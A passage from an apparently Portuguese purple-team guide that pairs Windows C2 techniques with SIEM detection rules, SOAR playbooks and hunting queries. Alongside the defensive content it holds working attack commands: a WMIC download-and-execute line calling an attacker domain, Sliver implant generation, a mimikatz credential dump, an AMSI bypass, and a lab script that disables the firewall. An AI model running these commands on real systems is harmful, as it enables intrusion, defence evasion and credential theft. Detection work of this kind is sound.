+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" -Name "EnableFirewall" -Value 0
+
+# Criar exceção para aplicação
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List" -Name "C:\Windows\System32\svchost.exe" -Value "C:\Windows\System32\svchost.exe:*:Enabled:Windows Update"
+```
+
+## Por que é mais stealth?
+
+- Não gera eventos de comando (netsh/powershell)
+- Difícil detectar sem monitoramento de registry
+- Persistente após reboot
+- Não aparece em GUI do firewall facilmente
+- Pode ser feito via processo legítimo
+
+## Como simular?
+
+```powershell
+# Simulação de registry bypass
+# EXECUTAR APENAS EM LAB
+
+param([string]$C2Path = "C:\Windows\Temp\update.exe")
+
+# Backup original
+$backupPath = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile"
+$originalValue = Get-ItemProperty -Path $backupPath -Name "EnableFirewall"
+
+# Desabilitar firewall
+Set-ItemProperty -Path $backupPath -Name "EnableFirewall" -Value 0
+Write-Host "[+] Firewall disabled via registry"
+
+# Adicionar exceção (método alternativo)
+$exceptionPath = "$backupPath\AuthorizedApplications\List"
+New-ItemProperty -Path $exceptionPath -Name $C2Path -Value "$C2Path:*:Enabled:System" -Force
+
+Write-Host "[+] Exception created for: $C2Path"
+```
+
+## Regra SIEM
+
+```yaml
+rule: registry_firewall_complete_bypass
+events:
+  - sysmon_event_id: 13  # Registry value set
+    target_object_contains_any:
+      - "\\FirewallPolicy\\StandardProfile\\EnableFirewall"
+      - "\\FirewallPolicy\\DomainProfile\\EnableFirewall"
+      - "\\FirewallPolicy\\PublicProfile\\EnableFirewall"
+    details: "DWORD (0x00000000)"
+
+  - sysmon_event_id: 12  # Registry key created
+    target_object_contains: "AuthorizedApplications\\List"
+
+correlation:
+  - within: 180 seconds
+    events:
+      - event_id: 7040  # Service state changed (mpssvc)
+        service_name: "mpssvc"
+        
+      - sysmon_event_id: 1
+        image_not_in: [system_processes]
+        integrity_level: "High"
+        
+      - sysmon_event_id: 3
+        destination_is_external: true
+
+scoring:
+  base: 90
+  + firewall_disabled: +30
+  + exception_added: +20
+  + followed_by_connection: +25
+
+severity: CRITICAL
+
+response_actions:
+  - immediate_isolation
+  - restore_firewall_state
+  - forensic_analysis
+  - check_persistence_mechanisms
+```
+
+---
+
+# 🎯 Técnica 7: WMIC Remote Execution com DNS Manipulation
+
+**MITRE ATT&CK:** T1047 (WMI) + T1071.004 (DNS)
+
+## O que é?
+
+Uso de WMIC (Windows Management Instrumentation Command-line) para executar comandos remotamente ou modificar DNS, técnica legada mas ainda efetiva em ambientes não remediados.
+
+## Como funciona?
+
+```powershell
+# Executar comando remoto
+wmic /node:192.168.1.50 process call create "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://pivot.sandsoncosta.com/payload.ps1')"
+
+# Modificar DNS remotamente
+wmic /node:192.168.1.50 nicconfig where "IPEnabled=True" call SetDNSServerSearchOrder ("192.168.1.100","8.8.8.8")
+```
+
+## Por que ainda é usado?
+
+- Nativo do Windows (até Windows 10)
+- Permite execução remota sem PSRemoting
+- Bypass de restrições de PowerShell
+- Funciona em redes com SMB habilitado
+
+## Regra SIEM
+
+```yaml
+rule: wmic_remote_execution_or_dns_manipulation
+events:
+  - event_id: 4688
+    process: wmic.exe
+    cmdline_contains_any:
+      - "/node:"
+      - "process call create"
+      - "SetDNSServerSearchOrder"
+      - "nicconfig"
+
+correlation:
+  - within: 120 seconds
+    events:
+      - event_id: 4688
+        parent_process: wmic.exe
+        
+      - sysmon_event_id: 3
+        source_process: wmic.exe
+        destination_port: 135  # DCOM
+
+severity: HIGH → CRITICAL (if remote execution)
+```
+
+---
+
+# 🎯 Técnica 8: DNS C2 com Canary Detection
+
+**MITRE ATT&CK:** T1071.004 (DNS) + T1095 (Non-Application Layer Protocol)
+
+## O que é?
+
+Command & Control via DNS tunneling usando subdomínios para enviar/receber dados, com canaries para detectar análise de blue team.
+
+## Como funciona?
+
+```
+Implant envia: cmd1.a3f9b2.pivot.sandsoncosta.com → DNS Server C2
+                                                          ↓
+DNS Server responde: TXT "next_command_base64" ← Retorna comando
+```
+
+Canary: domínio especial (ex: canary1.pivot.sandsoncosta.com) que alerta atacante se for resolvido por análise.
+
+## Como simular com Sliver?
+
+```bash
+# Configurar DNS C2 com canaries
+[server] sliver > dns --domains pivot.sandsoncosta.com --canary canary1.pivot.sandsoncosta.com
+
+# Gerar implant
+[server] sliver > generate --dns pivot.sandsoncosta.com --os windows --save dns-c2-implant.exe
+```
+
+## Regra SIEM
+
+```yaml
+rule: dns_c2_tunneling_with_canary_detection
+events:
+  - sysmon_event_id: 22
+    query_type: [TXT, NULL, CNAME]
+    query_name_contains: "pivot.sandsoncosta.com"
+    
+correlation:
+  - within: 60 seconds
+    count: > 50 queries
+    query_length: > 40
+    subdomain_entropy: > 3.5
+    
+  - canary_triggered:
+      query_name: "canary1.pivot.sandsoncosta.com"
+      action: alert_attacker_of_detection
+
+severity: CRITICAL
+
+response:
+  - block_domain_immediately
+  - isolate_host
+  - capture_all_dns_traffic
+```
+
+---
+
+# 🎯 Técnica 9: WireGuard Tunneling para Pivoting
+
+**MITRE ATT&CK:** T1572 (Protocol Tunneling) + T1090 (Proxy)
+
+## O que é?
+
+Uso do protocolo WireGuard (VPN moderno) para criar túneis criptografados para C2, permitindo pivoting seguro.
+
+## Por que é efetivo?
+
+- Criptografia forte (ChaCha20, Poly1305)
+- Performance superior (kernel-space)
+- Baixo overhead de rede
+- Difícil fingerprinting (UDP simples)
+- Bypassa firewalls corporativos
+
+## Como simular com Sliver?
+
+```bash
+# Configurar WireGuard listener
+[server] sliver > wg --lport 51820
+
+# Gerar implant
+[server] sliver > generate --wg pivot.sandsoncosta.com:51820 --os windows --save wg-implant.exe
+```
+
+## Regra SIEM
+
+```yaml
+rule: wireguard_c2_tunneling
+events:
+  - sysmon_event_id: 3
+    protocol: UDP
+    destination_port: 51820
+    destination: pivot.sandsoncosta.com
+
+  - sysmon_event_id: 1
+    image_contains: "wireguard"
+    
+correlation:
+  - within: 300 seconds
+    high_volume_udp_traffic: > 100 MB
+    
+severity: HIGH
+```
+
+---
+
+# 🎯 Técnica 10: BOF/COFF In-Memory Execution
+
+**MITRE ATT&CK:** T1620 (Reflective Code Loading) + T1055 (Process Injection)
+
+## O que é?
+
+Execução de Beacon Object Files (BOFs) ou Common Object File Format (COFF) in-memory via Sliver, permitindo post-exploitation sem gravar arquivos em disco.
+
+## Como funciona?
+
+```bash
+# Carregar BOF para dump de credenciais
+[server] sliver > execute-bof --coff-file mimikatz.coff --entry-point go
+
+# Ou usar BOFs da armory
+[server] sliver > armory install coff-loader
+[server] sliver > execute-assembly mimikatz.exe "sekurlsa::logonpasswords"
+```
+
+## Por que é perigoso?
+
+- Evade EDRs baseados em arquivo
+- Execução rápida sem persistência
+- Ideal para lateral movement
+- Difícil forense (não deixa rastros em disco)
+
+## Regra SIEM
+
+```yaml
+rule: sliver_bof_inmemory_execution
+events:
+  - sysmon_event_id: 7  # Image loaded
+    module_contains: "coff-loader"
+    
+  - sysmon_event_id: 8  # CreateRemoteThread
+    target_process_not: self
+    
+  - sysmon_event_id: 10  # Process access
+    granted_access: "0x1FFFFF"
+
+correlation:
+  - within: 60 seconds
+    events:
+      - sysmon_3: C2 connection
+      - event_4688: unusual child process
+      
+severity: CRITICAL
+```
+
+---
+
+# 3. Framework de Simulação Completo
+
+## 3.1 Preparação do Ambiente
+
+**Requisitos mínimos:**
+- VM Windows 11 / Server 2022 (vítima)
+- Kali Linux com Sliver instalado (C2 server)
+- VLAN isolada ou rede NAT
+- SIEM configurado (Splunk/Elastic/Sentinel)
+- Sysmon instalado com config SwiftOnSecurity
+- Domínio de teste: pivot.sandsoncosta.com
+
+## 3.2 Setup do Servidor C2 (Sliver)
+
+```bash
+# Instalação do Sliver
+go install github.com/bishopfox/sliver@latest
+
+# Iniciar servidor
+sliver-server
+
+# Configurar múltiplos listeners
+[server] sliver > mtls --lport 443
+[server] sliver > https --domain pivot.sandsoncosta.com --lport 80
+[server] sliver > dns --domains pivot.sandsoncosta.com
+[server] sliver > wg --lport 51820
+
+# Gerar implants para testes
+[server] sliver > generate --mtls pivot.sandsoncosta.com:443 --http pivot.sandsoncosta.com:80 --os windows --save multi-implant.exe
+```
+
+## 3.3 Configuração de Logs (Windows)
+
+```powershell
+# Habilitar auditoria avançada
+auditpol /set /category:"Detailed Tracking" /success:enable /failure:enable
+auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
+auditpol /set /category:"Object Access" /success:enable /failure:enable
+
+# Configurar PowerShell logging
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1
+
+# Instalar Sysmon
+sysmon64.exe -accepteula -i sysmonconfig-export.xml
+
+# Habilitar DNS logging
+Add-DnsServerQueryResolutionPolicy -Name "LogAllQueries" -Action ALLOW -ApplyOnRecursion -PassThru | Set-DnsServerQueryResolutionPolicy -EnableIPv6 $false
+```
+
+## 3.4 Script Master de Simulação
+
+```powershell
+# Complete-C2-Attack-Simulation.ps1
+# Script master para simular todas as 10 técnicas
+# EXECUTAR APENAS EM LAB CONTROLADO
+
+param(
+    [Parameter(Mandatory=$false)]
+    [ValidateSet(
+        "NetshPortForward",
+        "NetshAdvFirewall",
+        "SliverPivot",
+        "PowerShellFirewall",
+        "WMI_DNS",
+        "RegistryBypass",
+        "WMIC_Remote",
+        "DNS_C2",
+        "WireGuard",
+        "BOF_InMemory",
+        "AllTechniques"
+    )]
+    [string]$Technique = "AllTechniques",
+    
+    [string]$AttackerDomain = "pivot.sandsoncosta.com",
+    [string]$PayloadURL = "https://pivot.sandsoncosta.com:443/payload.exe",
+    [int]$C2Port = 443,
+    [switch]$CleanupAfter,
+    [switch]$VerboseLogging
+)
+
+# Banner
+Write-Host @"
+╔══════════════════════════════════════════════════════════════╗
+║         C2 Attack Simulation Framework v2.0                  ║
+║         Para treinamento de SOC e validação de SIEM          ║
+║         ⚠️  EXECUTAR APENAS EM AMBIENTE DE LAB  ⚠️           ║
+╚══════════════════════════════════════════════════════════════╝
+" -ForegroundColor Cyan
+
+# Funções de simulação
+function Invoke-NetshPortForward {
+    Write-Host "[*] Simulando: Netsh Port Forwarding" -ForegroundColor Yellow
+    
+    # Criar port proxy
+    netsh interface portproxy add v4tov4 `
+        listenport=8080 `
+        listenaddress=0.0.0.0 `
+        connectport=$C2Port `
+        connectaddress=$AttackerDomain
+    
+    # Regra de firewall
+    netsh advfirewall firewall add rule `
+        name="Windows Update Service" `
+        dir=in action=allow protocol=TCP localport=8080
+    
+    Write-Host "[+] Port forwarding configurado: 0.0.0.0:8080 -> $AttackerDomain:$C2Port"
+    
+    # Simular conexão
+    Test-NetConnection -ComputerName $AttackerDomain -Port $C2Port
+    
+    if ($CleanupAfter) {
+        Start-Sleep -Seconds 30
+        netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
+        netsh advfirewall firewall delete rule name="Windows Update Service"
+        Write-Host "[+] Cleanup concluído"
+    }
+}
+
+function Invoke-NetshAdvFirewall {
+    Write-Host "[*] Simulando: Netsh Adv Firewall Manipulation" -ForegroundColor Yellow
+    
+    # Desabilitar firewall
+    netsh advfirewall set allprofiles state off
+    
+    # Criar regra maliciosa
+    netsh advfirewall firewall add rule `
+        name="Core Networking Diagnostics" `
+        dir=out action=allow `
+        remoteip=$AttackerDomain enable=yes
+    
+    Write-Host "[+] Firewall manipulado para permitir $AttackerDomain"
+    
+    if ($CleanupAfter) {
+        Start-Sleep -Seconds 30
+        netsh advfirewall set allprofiles state on
+        netsh advfirewall firewall delete rule name="Core Networking Diagnostics"
+        Write-Host "[+] Cleanup concluído"
+    }
+}
+
+function Invoke-PowerShellFirewallAMSI {
+    Write-Host "[*] Simulando: PowerShell Firewall + AMSI Bypass" -ForegroundColor Yellow
+    
+    # AMSI Bypass (ofuscado)
+    $amsiBypass = @"
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)
+"@
+    
+    try {
+        Invoke-Expression $amsiBypass
+        Write-Host "[+] AMSI Bypass executado"
+    } catch {
+        Write-Host "[-] AMSI Bypass falhou (esperado em ambientes protegidos)"
+    }
+    
+    # Criar regra via PowerShell
+    New-NetFirewallRule `
+        -DisplayName "Windows Telemetry Service" `
+        -Direction Outbound `
+        -Action Allow `
+        -RemoteAddress $AttackerDomain `
+        -Protocol TCP `
+        -Enabled True
+    
+    Write-Host "[+] Regra de firewall criada via PowerShell"
+    
+    if ($CleanupAfter) {
+        Start-Sleep -Seconds 30
+        Remove-NetFirewallRule -DisplayName "Windows Telemetry Service"
+        Write-Host "[+] Cleanup concluído"
+    }
+}
+
+function Invoke-WMI_DNS_Hijacking {
+    Write-Host "[*] Simulando: WMI DNS Hijacking" -ForegroundColor Yellow
+    
+    # Backup DNS original
+    $nic = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select-Object -First 1
+    $originalDNS = $nic.DNSServerSearchOrder
+    
+    # Modificar DNS
+    $result = $nic.SetDNSServerSearchOrder(@("8.8.4.4", "8.8.8.8"))  # DNS seguro para simulação
+    
+    if ($result.ReturnValue -eq 0) {
+        Write-Host "[+] DNS modificado via WMI"
+    }
+    
+    # Simular queries DNS
+    1..50 | ForEach-Object {
+        $random = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
+        Resolve-DnsName "$random.$AttackerDomain" -ErrorAction SilentlyContinue
+        Start-Sleep -Milliseconds 100
+    }
+    
+    Write-Host "[+] 50 queries DNS anômalas geradas"
+    
+    if ($CleanupAfter) {
+        Start-Sleep -Seconds 30
+        $nic.SetDNSServerSearchOrder($originalDNS)
+        Write-Host "[+] DNS restaurado"
+    }
+}
+
+function Invoke-RegistryFirewallBypass {
+    Write-Host "[*] Simulando: Registry Firewall Bypass" -ForegroundColor Yellow
+    
+    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile"
+    
+    # Backup valor original
+    $originalValue = (Get-ItemProperty -Path $regPath -Name "EnableFirewall").EnableFirewall
+    
+    # Desabilitar firewall via registry
+    Set-ItemProperty -Path $regPath -Name "EnableFirewall" -Value 0
+    Write-Host "[+] Firewall desabilitado via registry"
+    
+    # Simular tráfego
+    Test-NetConnection -ComputerName $AttackerDomain -Port $C2Port
+    
+    if ($CleanupAfter) {
+        Start-Sleep -Seconds 30
+        Set-ItemProperty -Path $regPath -Name "EnableFirewall" -Value $originalValue
+        Write-Host "[+] Firewall restaurado"
+    }
+}
+
+function Invoke-WMIC_Execution {
+    Write-Host "[*] Simulando: WMIC Remote Execution (Local)" -ForegroundColor Yellow
+    
+    # Simular WMIC process creation
+    $cmd = "notepad.exe"
+    wmic process call create $cmd
+    
+    Write-Host "[+] Processo criado via WMIC"
+    
+    Start-Sleep -Seconds 5
+    
+    # Cleanup
+    Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue
+}
+
+# Executar técnicas
+switch ($Technique) {
+    "NetshPortForward" { Invoke-NetshPortForward }
+    "NetshAdvFirewall" { Invoke-NetshAdvFirewall }
+    "PowerShellFirewall" { Invoke-PowerShellFirewallAMSI }
+    "WMI_DNS" { Invoke-WMI_DNS_Hijacking }
+    "RegistryBypass" { Invoke-RegistryFirewallBypass }
+    "WMIC_Remote" { Invoke-WMIC_Execution }
+    "AllTechniques" {
+        Write-Host "[*] Executando TODAS as técnicas em sequência..." -ForegroundColor Cyan
+        Invoke-NetshPortForward
+        Start-Sleep -Seconds 10
+        Invoke-NetshAdvFirewall
+        Start-Sleep -Seconds 10
+        Invoke-PowerShellFirewallAMSI
+        Start-Sleep -Seconds 10
+        Invoke-WMI_DNS_Hijacking
+        Start-Sleep -Seconds 10
+        Invoke-RegistryFirewallBypass
+        Start-Sleep -Seconds 10
+        Invoke-WMIC_Execution
+    }
+}
+
+Write-Host "`n[✓] Simulação concluída! Verifique alertas no SIEM." -ForegroundColor Green
+```
+
+## 3.5 Validação no SIEM (Splunk Query Universal)
+
+```spl
+index=windows (EventCode IN (4688, 1, 4104, 5858, 13, 2004, 22, 3, 7, 8, 10))
+| eval technique=case(
+    (process_name="netsh.exe" AND like(CommandLine, "%portproxy%")), "Netsh Port Forward",
+    (process_name="netsh.exe" AND like(CommandLine, "%advfirewall%")), "Netsh Adv Firewall",
+    (EventCode=4104 AND like(ScriptBlockText, "%AmsiUtils%")), "AMSI Bypass",
+    (EventCode=4104 AND like(ScriptBlockText, "%New-NetFirewallRule%")), "PowerShell Firewall",
+    (EventCode=5858 AND like(MethodName, "%SetDNSServerSearchOrder%")), "WMI DNS Hijacking",
+    (EventCode=13 AND like(TargetObject, "%EnableFirewall%")), "Registry Firewall Bypass",
+    (process_name="wmic.exe"), "WMIC Execution",
+    (EventCode=22 AND QueryType IN ("TXT", "NULL")), "DNS C2 Tunneling",
+    (EventCode=3 AND DestinationPort=51820), "WireGuard Tunneling",
+    (EventCode=7 AND like(ImageLoaded, "%coff%")), "BOF In-Memory",
+    1=1, "Unknown"
+)
+| transaction host maxspan=300s
+| search technique!="Unknown"
+| stats count by technique, host, user, _time
+| sort -count
+```
+
+---
+
+# 4. Tuning de Regras: Reduzindo Falsos Positivos
+
+## 4.1 Baseline de Comportamento Normal (4-6 semanas)
+
+```python
+# Script para criar baseline
+import pandas as pd
+
+def create_baseline(siem_data, weeks=6):
+    """Cria baseline de comportamento normal"""
+    
+    baseline = {
+        'normal_processes': siem_data[
+            (siem_data['event_id'] == 4688) &
+            (siem_data['weeks_ago'] <= weeks)
+        ]['process_name'].value_counts().head(100).index.tolist(),
+        
+        'normal_dns_servers': siem_data[
+            siem_data['event_id'] == 5858
+        ]['dns_server'].value_counts().head(10).index.tolist(),
+        
+        'normal_firewall_rules': siem_data[
+            siem_data['event_id'] == 2004
+        ]['rule_name'].unique().tolist(),
+        
+        'normal_outbound_destinations': siem_data[
+            (siem_data['event_id'] == 3) &
+            (siem_data['direction'] == 'outbound')
+        ]['destination'].value_counts().head(200).index.tolist()
+    }
+    
+    return baseline
+
+# Aplicar whitelist nas regras
+baseline = create_baseline(logs_df)
+```
+
+## 4.2 Whitelist Management
+
+```yaml
+whitelists:
+  approved_dns_servers:
+    - 8.8.8.8
+    - 1.1.1.1
+    - 192.168.1.1  # DNS corporativo
+    
+  legitimate_firewall_rules:
+    - "Core Networking*"
+    - "File and Printer Sharing"
+    - "Remote Desktop*"
+    
+  authorized_processes:
+    - "C:\\Windows\\System32\\svchost.exe"
+    - "C:\\Program Files\\Company\\App.exe"
+    
+  known_good_domains:
+    - "*.microsoft.com"
+    - "*.company.internal"
+    - "update.windows.com"
+
+# Aplicar nas regras
+rule_condition:
+  - destination_not_in: [known_good_domains]
+  - process_not_in: [authorized_processes]
+```
+
+## 4.3 Scoring Inteligente
+
+```yaml
+dynamic_scoring:
+  factors:
+    - time_of_day:
+        business_hours: -10
+        after_hours: +20
+        weekends: +30
+    
+    - user_type:
+        admin_user: -5
+        service_account: -10
+        regular_user: +10
+        unknown_user: +25
+    
+    - process_reputation:
+        signed_microsoft: -15
+        signed_trusted: -10
+        unsigned: +20
+        known_malicious: +50
+    
+    - destination_reputation:
+        internal: -10
+        known_good_external: -5
+        unknown_external: +15
+        known_malicious: +50
+    
+    - frequency:
+        first_time_seen: +30
+        rare (< 5 occurrences): +20
+        common (> 100 occurrences): -15
+
+final_score = base_score + sum(factor_adjustments)
+```
+
+## 4.4 Métricas de Sucesso (Dashboard)
+
+```markdown
+| Métrica                          | Objetivo  | Atual | Status |
+|----------------------------------|-----------|-------|--------|
+| Taxa de Detecção (True Positive) | > 98%     | ___% | 🔴🟡🟢 |
+| Tempo Médio de Detecção (MTTD)   | < 30s     | ___s | 🔴🟡🟢 |
+| Falsos Positivos por Dia         | < 3       | ___  | 🔴🟡🟢 |
+| Falsos Negativos                 | 0         | ___  | 🔴🟡🟢 |
+| Tempo Médio de Resposta (MTTR)   | < 3min    | ___m | 🔴🟡🟢 |
+| Cobertura MITRE ATT&CK           | > 80%     | ___% | 🔴🟡🟢 |
+| Alertas Investigados             | 100%      | ___% | 🔴🟡🟢 |
+```
+
+---
+
+# 5. Integração com SOAR (Automação) - Continuação
+
+## 5.1 Playbook Automatizado Completo
+
+```yaml
+soar_playbook:
+  name: "C2_Detection_Response"
+  trigger:
+    - any_c2_detection_rule_fired
+    
+  actions:
+    1_enrichment:
+      - get_user_info_from_ad
+      - check_asset_criticality
+      - query_threat_intel_for_iocs
+      - get_process_parent_chain
+      - extract_network_connections
+      
+    2_validation:
+      - check_if_in_whitelist
+      - verify_digital_signature
+      - calculate_risk_score
+      - determine_if_false_positive
+      
+    3_containment:
+      if_score_critical:
+        - isolate_host_from_network
+        - kill_suspicious_processes
+        - block_c2_domain_at_firewall
+        - disable_user_account
+      if_score_high:
+        - alert_soc_analyst
+        - capture_network_traffic
+        - snapshot_vm_for_forensics
+      
+    4_investigation:
+      - dump_process_memory
+      - collect_registry_hives
+      - extract_firewall_rules
+      - gather_dns_query_history
+      - pull_recent_event_logs
+      - run_yara_rules_on_artifacts
+      
+    5_remediation:
+      - restore_firewall_settings
+      - remove_malicious_rules
+      - reset_dns_configuration
+      - delete_suspicious_files
+      - patch_vulnerabilities_exploited
+      
+    6_documentation:
+      - create_incident_ticket
+      - generate_timeline_of_events
+      - update_threat_intel_platform
+      - notify_stakeholders
+      - create_lessons_learned_report
+
+  sla:
+    initial_response: 5_minutes
+    containment: 15_minutes
+    full_remediation: 2_hours
+    post_incident_report: 24_hours
+```
+
+## 5.2 Script de Resposta Automatizada (PowerShell)
+
+```powershell
+# C2-Auto-Response.ps1
+# Script para resposta automatizada a detecções de C2
+
+param(
+    [Parameter(Mandatory=$true)]
+    [string]$AlertID,
+    
+    [Parameter(Mandatory=$true)]
+    [string]$HostName,
+    
+    [Parameter(Mandatory=$true)]
+    [ValidateSet("LOW", "MEDIUM", "HIGH", "CRITICAL")]
+    [string]$Severity,
+    
+    [string]$SuspiciousProcess,
+    [string]$C2Domain,
+    [string]$ThreatType,
+    [switch]$AutoContain
+)
+
+# Funções de resposta
+function Invoke-IsolateHost {
+    param([string]$Computer)
+    
+    Write-Host "[*] Isolando host: $Computer" -ForegroundColor Red
+    
+    # Desabilitar interfaces de rede (exceto loopback)
+    Invoke-Command -ComputerName $Computer -ScriptBlock {
+        Get-NetAdapter | Where-Object {$_.Name -ne "Loopback"} | Disable-NetAdapter -Confirm:$false
+    }
+    
+    Write-Host "[+] Host isolado com sucesso"
+}
+
+function Invoke-KillSuspiciousProcess {
+    param(
+        [string]$Computer,
+        [string]$ProcessName
+    )
+    
+    Write-Host "[*] Terminando processo suspeito: $ProcessName" -ForegroundColor Yellow
+    
+    Invoke-Command -ComputerName $Computer -ScriptBlock {
+        param($proc)
+        Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force
+    } -ArgumentList $ProcessName
+    
+    Write-Host "[+] Processo terminado"
+}
+
+function Invoke-CollectForensics {
+    param([string]$Computer)
+    
+    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+    $outputPath = "\\ForensicsShare\$Computer\$timestamp"
+    
+    New-Item -Path $outputPath -ItemType Directory -Force | Out-Null
+    
+    Write-Host "[*] Coletando artefatos forenses de: $Computer" -ForegroundColor Cyan
+    
+    # Coletar logs de eventos
+    $events = @('Security', 'System', 'Application', 'Microsoft-Windows-Sysmon/Operational')
+    foreach ($log in $events) {
+        Write-Host "  [+] Exportando log: $log"
+        wevtutil epl $log "$outputPath\$log.evtx" /r:$Computer
+    }
+    
+    # Coletar configurações de rede
+    Invoke-Command -ComputerName $Computer -ScriptBlock {
+        ipconfig /all > "$using:outputPath\ipconfig.txt"
+        netstat -ano > "$using:outputPath\netstat.txt"
+        arp -a > "$using:outputPath\arp.txt"
+    }
+    
+    # Coletar regras de firewall
+    netsh -r $Computer advfirewall firewall show rule name=all > "$outputPath\firewall_rules.txt"
+    
+    # Coletar processos em execução
+    Invoke-Command -ComputerName $Computer -ScriptBlock {
+        Get-Process | Export-Csv "$using:outputPath\processes.csv"
+        Get-Service | Export-Csv "$using:outputPath\services.csv"
+    }
+    
+    Write-Host "[+] Artefatos coletados em: $outputPath" -ForegroundColor Green
+}
+
+function Invoke-BlockC2Domain {
+    param([string]$Domain)
+    
+    Write-Host "[*] Bloqueando domínio C2: $Domain" -ForegroundColor Red
+    
+    # Adicionar ao firewall corporativo (exemplo com Windows Firewall)
+    netsh advfirewall firewall add rule `
+        name="BLOCK_C2_$Domain" `
+        dir=out action=block `
+        remoteip=$Domain `
+        enable=yes
+    
+    # Adicionar ao DNS sinkhole (exemplo com hosts file)
+    Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "0.0.0.0 $Domain"
+    
+    Write-Host "[+] Domínio bloqueado"
+}
+
+function Invoke-NotifySOC {
+    param(
+        [string]$AlertID,
+        [string]$Message,
+        [string]$Priority
+    )
+    
+    # Integração com plataforma de alertas (Slack, Teams, Email)
+    $webhook = "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
+    
+    $payload = @{
+        text = "🚨 *C2 Detection Alert* 🚨"
+        attachments = @(
+            @{
+                color = if($Priority -eq "CRITICAL") {"danger"} else {"warning"}
+                fields = @(
+                    @{
+                        title = "Alert ID"
+                        value = $AlertID
+                        short = $true
+                    },
+                    @{
+                        title = "Severity"
+                        value = $Priority
+                        short = $true
+                    },
+                    @{
+                        title = "Host"
+                        value = $HostName
+                        short = $true
+                    },
+                    @{
+                        title = "Details"
+                        value = $Message
+                        short = $false
+                    }
+                )
+            }
+        )
+    } | ConvertTo-Json -Depth 4
+    
+    Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
+}
+
+# Workflow de resposta baseado em severidade
+Write-Host "`n╔══════════════════════════════════════════════════════════════╗"
+Write-Host "║           C2 Auto-Response Initiated                         ║"
+Write-Host "║           Alert ID: $AlertID                      ║"
+Write-Host "╚══════════════════════════════════════════════════════════════╝`n"
+
+switch ($Severity) {
+    "CRITICAL" {
+        Write-Host "[!] CRITICAL SEVERITY - Resposta imediata iniciada" -ForegroundColor Red
+        
+        # Contenção imediata
+        if ($AutoContain) {
+            Invoke-IsolateHost -Computer $HostName
+        }
+        
+        if ($SuspiciousProcess) {
+            Invoke-KillSuspiciousProcess -Computer $HostName -ProcessName $SuspiciousProcess
+        }
+        
+        if ($C2Domain) {
+            Invoke-BlockC2Domain -Domain $C2Domain
+        }
+        
+        # Coletar forenses
+        Invoke-CollectForensics -Computer $HostName
+        
+        # Notificar SOC
+        Invoke-NotifySOC -AlertID $AlertID -Message "CRITICAL C2 activity detected on $HostName. Host isolated and forensics collected." -Priority "CRITICAL"
+    }
+    
+    "HIGH" {
+        Write-Host "[!] HIGH SEVERITY - Contenção parcial" -ForegroundColor Yellow
+        
+        if ($SuspiciousProcess) {
+            Invoke-KillSuspiciousProcess -Computer $HostName -ProcessName $SuspiciousProcess
+        }
+        
+        if ($C2Domain) {
+            Invoke-BlockC2Domain -Domain $C2Domain
+        }
+        
+        Invoke-CollectForensics -Computer $HostName
+        Invoke-NotifySOC -AlertID $AlertID -Message "HIGH severity C2 activity on $HostName. Manual review required." -Priority "HIGH"
+    }
+    
+    "MEDIUM" {
+        Write-Host "[!] MEDIUM SEVERITY - Monitoramento e coleta" -ForegroundColor Cyan
+        
+        Invoke-CollectForensics -Computer $HostName
+        Invoke-NotifySOC -AlertID $AlertID -Message "MEDIUM severity C2 indicator on $HostName. Investigation recommended." -Priority "MEDIUM"
+    }
+    
+    "LOW" {
+        Write-Host "[!] LOW SEVERITY - Logging apenas" -ForegroundColor Green
+        Invoke-NotifySOC -AlertID $AlertID -Message "LOW severity C2 indicator on $HostName. Added to watchlist." -Priority "LOW"
+    }
+}
+
+Write-Host "`n[✓] Resposta automatizada concluída" -ForegroundColor Green
+```
+
+---
+
+# 6. Threat Hunting Proativo
+
+## 6.1 Hipóteses de Caça
+
+```markdown
+### Hipótese 1: C2 via DNS Tunneling não detectado
+**Premissa:** Atacantes podem usar DNS tunneling com baixo volume para evadir detecções
+
+**Como validar:**
+1. Buscar queries DNS com alta entropia de subdomínios
+2. Identificar padrões de beacon (intervalo regular)
+3. Analisar tipos de registro incomuns (TXT, NULL)
+4. Verificar queries para domínios recém-registrados
+
+**Query de caça:**
+```spl
+index=sysmon EventCode=22 
+| eval subdomain_length=len(QueryName)
+| eval subdomain_entropy=entropy(QueryName)
+| where subdomain_length > 40 AND subdomain_entropy > 3.5
+| stats count by QueryName, Computer, Image
+| where count > 10
+```
+
+### Hipótese 2: Port forwarding legado não monitorado
+**Premissa:** Netsh portproxy pode estar configurado sem detecção
+
+**Como validar:**
+```powershell
+# Script de hunting em todos os endpoints
+Invoke-Command -ComputerName (Get-ADComputer -Filter *).Name -ScriptBlock {
+    $proxies = netsh interface portproxy show all
+    if ($proxies -notlike "*No entries*") {
+        [PSCustomObject]@{
+            Computer = $env:COMPUTERNAME
+            Proxies = $proxies
+            Suspicious = $true
+        }
+    }
+} | Where-Object {$_.Suspicious} | Export-Csv "portproxy_findings.csv"
+```
+
+### Hipótese 3: Firewall rules maliciosas mascaradas
+**Premissa:** Regras de firewall com nomes legítimos podem estar permitindo C2
